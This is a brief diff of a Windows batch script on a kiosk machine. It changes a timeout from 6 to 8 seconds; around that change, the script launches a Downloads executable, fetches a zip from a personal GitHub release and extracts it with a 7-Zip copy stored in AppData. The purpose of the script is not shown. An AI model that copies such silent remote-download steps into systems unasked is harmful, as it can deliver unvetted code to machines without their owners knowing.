@@ -40,7 +40,7 @@ if not exist "%unzipFolder%" (
 
 start "" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
 
-timeout /t 6
+timeout /t 8
 
 "C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
 "C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x "C:\Users\kiosk\Downloads\G.zip" -oC:\Users\kiosk\Downloads\G
